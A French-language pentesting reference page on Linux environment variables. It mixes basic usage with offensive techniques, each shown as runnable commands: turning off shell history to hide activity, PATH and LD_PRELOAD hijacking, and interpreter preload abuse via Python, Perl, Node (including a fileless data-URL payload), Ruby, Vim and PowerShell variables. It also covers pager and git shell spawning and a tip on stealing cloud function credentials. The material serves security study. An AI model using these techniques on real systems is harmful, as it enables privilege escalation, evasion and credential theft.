# Variables d’environnement Linux

{{#include ../../banners/hacktricks-training.md}}

## Variables globales

Les variables globales **seront** héritées par les **processus enfants**.

Vous pouvez créer une variable globale pour votre session actuelle en faisant :

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

Cette variable sera accessible depuis vos sessions actuelles et leurs processus enfants.

Vous pouvez **supprimer** une variable en exécutant :

```bash
unset MYGLOBAL
```

## Variables locales

Les **variables locales** ne peuvent être **consultées** que par le **shell/script actuel**.

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## Lister les variables actuelles

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

Le contenu de `/proc/*/environ` est séparé par des octets NUL, donc ces variantes sont généralement plus faciles à lire :

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

Si vous recherchez des **identifiants** ou une **configuration de service intéressante** dans des environnements hérités, consultez également [Linux Post Exploitation](../post-exploitation/README.md).

## Variables courantes

Source : [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – l’affichage utilisé par **X**. Cette variable est généralement définie sur **:0.0**, ce qui désigne le premier affichage de l’ordinateur actuel.
- **EDITOR** – l’éditeur de texte préféré de l’utilisateur.
- **HISTFILESIZE** – le nombre maximal de lignes contenues dans le fichier d’historique.
- **HISTSIZE** – le nombre de lignes ajoutées au fichier d’historique lorsque l’utilisateur termine sa session.
- **HOME** – votre répertoire personnel.
- **HOSTNAME** – le nom d’hôte de l’ordinateur.
- **LANG** – votre langue actuelle.
- **MAIL** – l’emplacement de la boîte aux lettres de l’utilisateur. Généralement **/var/spool/mail/USER**.
- **MANPATH** – la liste des répertoires où rechercher les pages de manuel.
- **OSTYPE** – le type de système d’exploitation.
- **PS1** – l’invite par défaut dans bash.
- **PATH** – contient les chemins de tous les répertoires qui hébergent les fichiers binaires que vous souhaitez exécuter en indiquant uniquement leur nom, sans chemin relatif ni absolu.
- **PWD** – le répertoire de travail actuel.
- **SHELL** – le chemin vers le shell de commande actuel (par exemple, **/bin/bash**).
- **TERM** – le type de terminal actuel (par exemple, **xterm**).
- **TZ** – votre fuseau horaire.
- **USER** – votre nom d’utilisateur actuel.

## Variables intéressantes pour le hacking

Toutes les variables ne sont pas aussi utiles. Du point de vue offensif, privilégiez les variables qui modifient les **chemins de recherche**, les **fichiers de démarrage**, le **comportement de l’éditeur de liens dynamique** ou l’**audit/la journalisation**.

### **HISTFILESIZE**

**Définissez la valeur de cette variable sur 0** afin que, lorsque vous **terminez votre session**, le **fichier d’historique** (\~/.bash_history) soit **tronqué à 0 ligne**.

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

Définissez la **valeur de cette variable sur 0** afin que les commandes **ne soient pas conservées dans l’historique en mémoire** et ne soient pas réécrites dans le **fichier d’historique** (\~/.bash_history).

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

Si **la valeur de cette variable est définie sur `ignorespace` ou `ignoreboth`**, toute commande précédée d’une espace supplémentaire ne sera pas enregistrée dans l’historique.

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

Dirigez le **fichier d’historique** vers **`/dev/null`** ou désactivez-le complètement. Cette méthode est généralement plus fiable que de simplement modifier la taille de l’historique.

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy et https_proxy

Les processus utiliseront le **proxy** déclaré ici pour se connecter à Internet via **http ou https**.

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy` : proxy par défaut pour les outils/protocoles qui le prennent en charge.
- `no_proxy` : liste d’exclusion (hosts/domaines/CIDR) qui doivent se connecter directement.

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

Les variantes en minuscules et en majuscules peuvent être utilisées selon l’outil (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Les processus feront confiance aux certificats indiqués dans **ces variables d’environnement**. Cela permet notamment de faire en sorte que des outils tels que **`curl`**, **`git`**, les clients HTTP Python ou les gestionnaires de paquets fassent confiance à une CA contrôlée par l’attaquant (par exemple, pour donner à un proxy d’interception une apparence légitime).

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

Si un wrapper/script privilégié exécute des commandes **sans chemins absolus**, c’est le **premier répertoire contrôlé par l’attaquant** dans `PATH` qui l’emporte. C’est le mécanisme à l’origine de nombreux **PATH hijacks** dans `sudo`, les tâches cron, les wrappers shell et les helpers SUID personnalisés. Recherchez `env_keep+=PATH`, un `secure_path` faible ou des wrappers qui appellent `tar`, `service`, `cp`, `python`, etc. par leur nom.

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

Pour consulter des chaînes complètes d’élévation de privilèges exploitant `PATH`, voir [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` ne désigne pas seulement un répertoire : de nombreux outils chargent automatiquement des **dotfiles**, des **plugins** et la **configuration par utilisateur** depuis `$HOME` ou `$XDG_CONFIG_HOME`. Si un workflow privilégié conserve ces valeurs, l’**injection de configuration** peut être plus facile que le détournement de binaire.

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

Les cibles intéressantes incluent `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` et des fichiers propres à certains outils, comme `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Ces variables influencent l’**éditeur de liens dynamique** :

- `LD_PRELOAD` : force le chargement préalable d’objets partagés supplémentaires.
- `LD_LIBRARY_PATH` : ajoute des répertoires en tête de la liste de recherche des bibliothèques.
- `LD_AUDIT` : charge des bibliothèques d’audit qui observent le chargement des bibliothèques et la résolution des symboles.

Elles sont extrêmement utiles pour le **hooking**, l’**instrumentation** et la **privilege escalation** si une commande privilégiée les conserve. En mode **secure-execution** (`AT_SECURE`, par exemple avec setuid/setgid/des capabilities), le loader supprime ou restreint beaucoup de ces variables. Cependant, les bugs de parsing dans cette première étape du loader peuvent avoir un impact important, car ils se produisent **avant** le programme cible.<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` modifie le comportement initial de glibc (par exemple, les paramètres de l’allocateur) et s’avère très utile dans les labs d’exploit. Cette variable est également importante du point de vue de la sécurité, car le **dynamic loader l’analyse très tôt**. La faille **Looney Tunables** de 2023 a rappelé qu’une seule variable d’environnement analysée par le loader peut devenir un **mécanisme local d’escalade de privilèges** contre les programmes SUID.<sup>[[6]](#references)</sup>

Pour CVE-2023-4911, comparez la **version du paquet de la distribution installé** à la version corrigée publiée par son éditeur et vérifiez quel loader est réellement utilisé par les nouveaux processus. Se fier uniquement au numéro de version upstream n’est pas fiable : Debian a rétroporté le parseur vulnérable dans son paquet 2.31, tandis que des distributions ont rétroporté des correctifs sans modifier le numéro upstream. Une transition de privilèges effective nécessite également un exécutable cible privilégié dont le changement d’identité n’est bloqué ni par `NoNewPrivs`, ni par un montage `nosuid`, ni par une autre mesure d’atténuation. Évitez d’exécuter un test de crash avec un `GLIBC_TUNABLES` malformé pendant une enumeration passive. Consultez le [suivi Ubuntu](https://ubuntu.com/security/CVE-2023-4911), le [suivi Debian](https://security-tracker.debian.org/tracker/CVE-2023-4911) et l’[avis de Red Hat](https://access.redhat.com/security/cve/cve-2023-4911) pour connaître l’applicabilité selon la version ; l’[avis de sécurité](https://ubuntu.com/security/notices/USN-6409-1) d’Ubuntu recommande également de redémarrer après la mise à jour.

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

Si **Bash** est démarré en mode **non interactif**, il vérifie `BASH_ENV` et charge ce fichier avant d’exécuter le script cible. Lorsque Bash est invoqué sous le nom `sh`, ou en mode interactif de type POSIX, `ENV` peut également être consulté. C’est une méthode classique pour transformer un wrapper shell en exécution de code si l’environnement est contrôlé par un attaquant.

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Bash ignore ces fichiers de démarrage lorsque les **ID réels/effectifs diffèrent** ; `-p` préserve l’ID effectif, mais n’active pas ces fichiers de démarrage. Le comportement exact dépend donc de la manière dont le wrapper lance le shell. Faites attention aux wrappers privilégiés qui appellent `setuid()`/`setgid()` **avant** de lancer Bash : une fois que les ID correspondent à nouveau, Bash peut faire confiance à `BASH_ENV`, `ENV` et aux variables d’état du shell associées, qu’il aurait autrement ignorées.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Lorsque Bash s’exécute avec **xtrace** activé, il développe `PS4` et l’affiche avant chaque commande tracée. `PS4` est développé comme une invite, donc une **substitution de commande** qu’il contient est exécutée. Point crucial : xtrace peut être activé uniquement depuis l’environnement en exportant `SHELLOPTS=xtrace` — aucun `-x` n’est nécessaire sur la ligne de commande — de sorte que tout script Bash exécuté par la victime devient un vecteur d’exécution de code.<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4` ne fait rien tant que xtrace n’est pas activé (`SHELLOPTS=xtrace`, `set -x` ou `bash -x`), et Bash supprime `SHELLOPTS` dans les contextes privilégiés/setuid, comme `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Ces variables modifient le démarrage de Python :

- `PYTHONPATH` : ajoute des chemins de recherche d’importation en préfixe.
- `PYTHONHOME` : déplace l’arborescence de la bibliothèque standard.
- `PYTHONSTARTUP` : exécute un fichier avant l’invite interactive.
- `PYTHONINSPECT=1` : passe en mode interactif à la fin de l’exécution d’un script.
- `PYTHONBREAKPOINT` : `package.module.callable` est appelé (et son module importé) lorsque le code atteint `breakpoint()`.<sup>[[8]](#references)</sup>

Elles sont utiles contre les scripts de maintenance, les debuggers, les shells et les wrappers qui appellent Python avec un environnement contrôlable. `python -E` et `python -I` ignorent toutes les variables `PYTHON*`.

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

Un exemple récent dans le monde réel est la LPE **needrestart** de 2024 sur les systèmes Ubuntu/Debian : le scanner appartenant à root copiait le `PYTHONPATH` d'un processus non privilégié depuis `/proc/<PID>/environ`, puis exécutait Python. L'exploit publié plaçait `importlib/__init__.so` dans le chemin contrôlé par l'attaquant, afin que Python exécute le code de l'attaquant pendant sa propre initialisation, avant même que le script codé en dur de l'assistant n'entre en jeu.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl dispose de variables de démarrage tout aussi utiles :

- `PERL5LIB` : ajoute des répertoires de bibliothèques en tête de la liste.
- `PERL5OPT` : injecte des options comme si elles figuraient sur chaque ligne de commande `perl`.

Cela peut forcer le **chargement automatique de modules** ou modifier le comportement de l'interpréteur avant que le script cible ne fasse quoi que ce soit d'intéressant. Perl ignore ces variables dans les contextes **taint / setuid / setgid**, mais elles restent très importantes pour les wrappers exécutés normalement par root, les tâches CI, les installateurs et les règles sudoers personnalisées.

Si une règle sudo autorise la surcharge de l'environnement et que la commande privilégiée lance finalement Perl, examinez également `PERL5DB`. La documentation de Perl indique que `PERL5OPT=-d` démarre le débogueur et que `PERL5DB` fournit le code d'initialisation du débogueur lorsque Perl démarre avec une option `-d` seule. Supprimer uniquement `PERL5LIB` et `PERLLIB` ne supprime pas cette possibilité. Les variables doivent être conservées par sudo et le wrapper, et le processus Perl ne doit pas les ignorer à cause du taint ou du traitement des ID définis ; examinez la règle exacte et la chaîne d'exécution sans lancer l'assistant privilégié pendant l'énumération. Consultez [perlrun's environment-variable reference](https://perldoc.perl.org/perlrun#ENVIRONMENT).

Le chemin de recherche intégré [`@INC` search path](https://perldoc.perl.org/perlvar#@INC) de Perl constitue une autre frontière de confiance des modules, même sans variables d'environnement conservées. Pour un processus Perl privilégié, vérifiez qu'une instruction `use` ou `require` correspond bien au nom de module résolu, à l'ordre de recherche et à la possibilité pour un utilisateur moins privilégié de créer ou remplacer ce module dans un répertoire parcouru. Un répertoire de bibliothèques accessible en écriture ne suffit pas à établir que le processus privilégié y chargera du code.

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

`NODE_OPTIONS` ajoute des **options CLI Node.js** au début de chaque processus `node` qui hérite de l’environnement. Cette variable est donc utile contre les wrappers, les tâches CI, les helpers Electron et les règles sudo qui finissent par invoquer Node. Les options les plus intéressantes en offensive sont généralement :

- `--require <file>` : précharge un fichier CommonJS avant le script cible.
- `--import <module>` : précharge un module ES avant le script cible.

Node rejette certaines options dangereuses dans `NODE_OPTIONS`, mais `--require` et `--import` sont explicitement autorisées et sont traitées **avant** les arguments habituels de la ligne de commande.<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### Préchargement sans fichier avec une URL `data:`

Lorsque vous pouvez définir `NODE_OPTIONS`, mais **ne pouvez pas écrire de fichier** sur la cible (système de fichiers en lecture seule, API restreinte, environnement serverless, etc.), `--import` accepte une URL `data:text/javascript,` : le payload est donc entièrement contenu dans la variable d’environnement. Le JavaScript doit être **entièrement encodé pour une URL** — Node interprète la valeur comme une URL : tout espace brut (ou autre caractère non encodé) tronque le payload et déclenche une `SyntaxError`. Cela fonctionne avec Node 20.6+, où `--import` figure sur la liste d’autorisation de `NODE_OPTIONS`.<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> C'est une méthode courante pour transformer le contrôle de `NODE_OPTIONS` en RCE sur des **environnements cloud managés** dont les fonctions exécutent Node. Par exemple, un attaquant qui peut uniquement modifier la configuration d'une Lambda (`lambda:UpdateFunctionConfiguration`, sans `iam:PassRole` ni mise à jour du code) peut injecter `NODE_OPTIONS=--import data:text/javascript,<payload>` pour exécuter du code dans la fonction et voler les identifiants de son rôle d'exécution. Le module injecté s'exécute **avant** le handler, qui s'exécute ensuite normalement.

Pour les chaînes de gadgets à distance qui définissent indirectement `NODE_OPTIONS` (par exemple, une pollution de prototype menant à une RCE), consultez [cette autre page](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby offre la même catégorie d'abus au démarrage :

- `RUBYLIB` : ajoute des répertoires au début du chemin de chargement de Ruby.
- `RUBYOPT` : injecte des options de ligne de commande telles que `-r` dans chaque invocation de `ruby`.

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

Les vulnérabilités de **needrestart** découvertes en 2024 ont montré qu’il ne s’agissait pas seulement d’une astuce de labo : le même helper appartenant à root qui était vulnérable à l’abus de `PYTHONPATH` pouvait aussi être contraint à lancer Ruby avec un `RUBYLIB` contrôlé par un attaquant, et à charger `enc/encdb.so` depuis un répertoire contrôlé par un attaquant.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim exécutent les commandes Ex contenues dans `VIMINIT` (ou dans sa variable de repli `EXINIT`) au démarrage normal. Les commandes Ex comprennent `:!cmd` et `:call system(...)` : contrôler la variable permet donc d’exécuter du code chaque fois qu’une victime ouvre Vim (`sudo vim` en tant que root, `crontab -e`, `visudo`, `git`/`less` lançant `$EDITOR`, etc.).<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

Le mode batch (`vim -es`/`-Es`) ignore ces variables, mais un démarrage interactif normal les exécute.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core (`pwsh`) fonctionne sous Linux/macOS (et Windows) et est une **application .NET**. Plusieurs variables d’environnement peuvent donc transformer tout lancement de `pwsh` avec un environnement hérité en exécution de code — une technique utile contre les tâches cron/systemd, les runners CI et les wrappers privilégiés qui lancent `pwsh`.

- `PSModulePath` : PowerShell recherche récursivement dans chaque répertoire de cette liste des modules `.psd1`/`.psm1` et en **charge automatiquement** un dès qu’une commande qu’il exporte est appelée pour la première fois. Ajoutez un répertoire en tête de liste et le code de premier niveau de votre module s’exécute lors de son importation ; comme la résolution suit l’ordre *Alias → Function → Cmdlet*, une fonction exportée peut même masquer un cmdlet intégré appelé par la victime.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME` : redirige vers `powershell/Microsoft.PowerShell_profile.ps1`, exécuté au démarrage (sauf avec `-NoProfile`).
- `DOTNET_STARTUP_HOOKS` : assembly managé dont `StartupHook.Initialize()` s’exécute avant `Main` (commun à toutes les applications .NET).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so` : l’API de profiling CLR charge une bibliothèque contrôlée par l’attaquant dans le processus au démarrage (les variables de chemin prévalent sur le registre ; `DOTNET_*` est l’alias plus récent). Sous Windows PowerShell 5.1 (.NET Framework), utilisez `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

Sous Windows, `PSExecutionPolicyPreference=Bypass` désactive également la protection qui bloque les scripts non signés, permettant ainsi à un profil/module placé à cet effet de s’exécuter. Consultez la page dédiée pour les PoC complets :

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Certains outils ne se contentent pas de lire un chemin depuis l’environnement : ils transmettent la valeur à un **shell**, un **éditeur** ou un **préprocesseur d’entrée**. Ces variables sont donc particulièrement intéressantes lorsqu’un wrapper privilégié exécute `git`, `man`, `less` ou des visionneuses de texte similaires :

- `PAGER`, `MANPAGER`, `GIT_PAGER` : choisissent la commande du pager.
- `GIT_EDITOR`, `VISUAL`, `EDITOR` : choisissent la commande de l’éditeur, souvent avec des arguments.
- `LESSOPEN`, `LESSCLOSE` : définissent les pré/post-processeurs exécutés lorsque `less` ouvre un fichier.

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Git prend également en charge l’injection de configuration via les variables d’environnement uniquement, sans toucher au disque, avec `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` et `GIT_CONFIG_VALUE_<n>` :

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

Du point de vue du post-exploitation, n’oubliez pas non plus que les environnements hérités contiennent souvent des **identifiants**, des **paramètres de proxy**, des **jetons de service** ou des **clés cloud**. Consultez [Linux Post Exploitation](../post-exploitation/README.md) pour rechercher des variables dans `/proc/<PID>/environ` et `Environment=` dans `systemd`.

### PS1

Modifiez l’apparence de votre invite de commande.

[**Voici un exemple**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root :

![PERL5OPT & PERL5LIB - PS1 : Voici un exemple](<../images/image (897).png>)

Utilisateur standard :

![PERL5OPT & PERL5LIB - PS1 : Un, deux et trois jobs en arrière-plan](<../images/image (740).png>)

Un, deux et trois jobs en arrière-plan :

![PERL5OPT & PERL5LIB - PS1 : Un, deux et trois jobs en arrière-plan](<../images/image (145).png>)

Un job en arrière-plan, un job arrêté et la dernière commande ne s’est pas terminée correctement :

![PERL5OPT & PERL5LIB - PS1 : Un job en arrière-plan, un job arrêté et la dernière commande ne s’est pas terminée correctement](<../images/image (715).png>)

## References

- [1] [Manuel GNU Bash - Fichiers de démarrage de Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Page du manuel Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPE dans needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Documentation de l’interface en ligne de commande Node.js - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Variables d’environnement courantes - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911 : Looney Tunables - élévation de privilèges locale dans ld.so de glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [Manuel GNU Bash - Variables Bash (`PS4`) et commande intégrée Set (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - Fonction intégrée breakpoint() et PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Documentation Vim - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath et chargement automatique des modules PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Paramètres de configuration du débogage et du profilage .NET (variables de profileur `CORECLR_`/`DOTNET_`/`COR_`)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
